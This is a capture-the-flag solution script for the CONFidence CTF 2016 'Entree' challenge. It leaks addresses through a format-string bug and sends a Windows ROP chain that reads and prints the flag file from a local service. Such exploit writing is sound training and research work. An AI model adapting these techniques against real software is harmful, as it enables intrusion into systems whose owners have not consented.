#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Entree
# Competition:      CONFidence CTF 2016
# Category:         Software exploitation
# Scoring:          250 pts (medium difficulty)
# Number of solves: 1 out of 22 teams

import sys
import struct
import socket
import telnetlib

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def dd(x):
  return struct.pack("<I", x)

def main():
  # Connect to the service.
  s = socket.socket()
  s.connect(("127.0.0.1", 4141))

  # Leak the program base address and stack address through the format string bug.
  payload = "%x " * 5
  read_until(s, "Enter number of bytes: ")
  s.sendall("%d\n" % len(payload))
  read_until(s, "Enter data: ")
  s.sendall(payload[::-1])

  leaked_data = read_until(s, "\n").split(" ")
  IMAGEBASE = int(leaked_data[0], 16) - 0x17b5
  STACKADDR = int(leaked_data[4], 16) - 0x58

  print "[+] Leaked image base: %x, stack address: %x" % (IMAGEBASE, STACKADDR)

  # Construct a ROP chain printing out the flag.
  FLAG_FILENAME = "flag.txt\0".encode("utf-16")[2:]
  FLAG_FILENAME_OFFSET   = 0x100
  FLAG_BUFFER_OFFSET     = 0x120
  BYTES_PROCESSED_OFFSET = 0x160

  rop = (
       (dd(IMAGEBASE + 0xa8a6)                  + # call ds:CreateFileW; ...; ret
          dd(STACKADDR + FLAG_FILENAME_OFFSET)  + # lpFileName (L"flag.txt")
          dd(0x80000000)                        + # dwDesiredAccess (GENERIC_READ)
          dd(0x00000001)                        + # dwShareMode (FILE_SHARE_READ)
          dd(0x00000000)                        + # lpSecurityAttributes (NULL)
          dd(0x00000003)                        + # dwCreationDisposition (OPEN_EXISTING)
          dd(0x00000080)                        + # dwFlagsAndAttributes (FILE_ATTRIBUTE_NORMAL)
          dd(0x00000000)                        + # hTemplateFile (NULL)
        dd(IMAGEBASE + 0x81bc)                  + # pop esi; pop edi; ret
          dd(IMAGEBASE + 0x1296)                + # pop r32; ret
          dd(STACKADDR + 18 * 4)                + # address of the ReadFile() hFile argument in ROP.
        dd(IMAGEBASE + 0x1c18)                  + # mov [edi], eax; call esi
        dd(IMAGEBASE + 0x9696)                  + # pop eax; pop r32; ret
          dd(IMAGEBASE + 0xf0f0)                + # .idata!ReadFile
          dd(0x11111111)                        + # r32 placeholder.
        dd(IMAGEBASE + 0x95ec)                  + # mov eax, [eax]; mov [esp], eax; ret
          dd(0x22222222)                        + # placeholder overwritten by the gadget itself.
        dd(IMAGEBASE + 0x116e)                  + # ret
          dd(0x33333333)                        + # hFile (filled out by a previous gadget)
          dd(STACKADDR + FLAG_BUFFER_OFFSET)    + # lpBuffer
          dd(0x00000100)                        + # nNumberOfBytesToRead
          dd(STACKADDR + BYTES_PROCESSED_OFFSET)+ # lpNumberOfBytesRead
          dd(0x00000000)                        + # lpOverlapped (NULL)
        dd(IMAGEBASE + 0x9696)                  + # pop eax; pop r32; ret
          dd(IMAGEBASE + 0xf044)                + # .idata!GetStdHandle
          dd(0x11111111)                        + # r32 placeholder.
        dd(IMAGEBASE + 0x95ec)                  + # mov eax, [eax]; mov [esp], eax; ret
          dd(0x22222222)                        + # placeholder overwritten by the gadget itself.
        dd(IMAGEBASE + 0x116e)                  + # ret
          dd(0xfffffff5)                        + # nStdHandle (STD_OUTPUT_HANDLE)
       dd(IMAGEBASE + 0x81bc)                   + # pop esi; pop edi; ret
          dd(IMAGEBASE + 0x1296)                + # pop r32; ret
          dd(STACKADDR + 40 * 4)                + # address of the WriteFile() hFile argument in ROP.
        dd(IMAGEBASE + 0x1c18)                  + # mov [edi], eax; call esi
        dd(IMAGEBASE + 0x9696)                  + # pop eax; pop r32; ret
          dd(IMAGEBASE + 0xf048)                + # .idata!WriteFile
          dd(0x11111111)                        + # r32 placeholder.
        dd(IMAGEBASE + 0x95ec)                  + # mov eax, [eax]; mov [esp], eax; ret
          dd(0x22222222)                        + # placeholder overwritten by the gadget itself.
        dd(IMAGEBASE + 0x116e)                  + # ret
          dd(0x33333333)                        + # hFile (filled out by a previous gadget)
          dd(STACKADDR + FLAG_BUFFER_OFFSET)    + # lpBuffer
          dd(0x00000100)                        + # nNumberOfBytesToWrite
          dd(STACKADDR + BYTES_PROCESSED_OFFSET)+ # lpNumberOfBytesWritten
          dd(0x00000000)                        + # lpOverlapped (NULL)
        dd(IMAGEBASE + 0x5979)                  + # call ds:Sleep; pop ebp; ret
          dd(5000)                              + # dwMilliseconds (5000)
          dd(0x44444444)                        + # placeholder for popped ebp.
        dd(IMAGEBASE + 0x1043)                  + # push 1; call ds:ExitProcess
        dd(0xaabbccdd)                            # debug breakpoint
       ).ljust(FLAG_FILENAME_OFFSET, "\xcc") + FLAG_FILENAME
      )

  # Save the ROP chain on the stack.
  read_until(s, "Enter number of bytes: ")
  s.sendall("%#x\n" % (STACKADDR + len(rop)))
  read_until(s, "Enter data: ")
  s.sendall(rop[::-1].ljust(1024 * 1024, "A"))

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
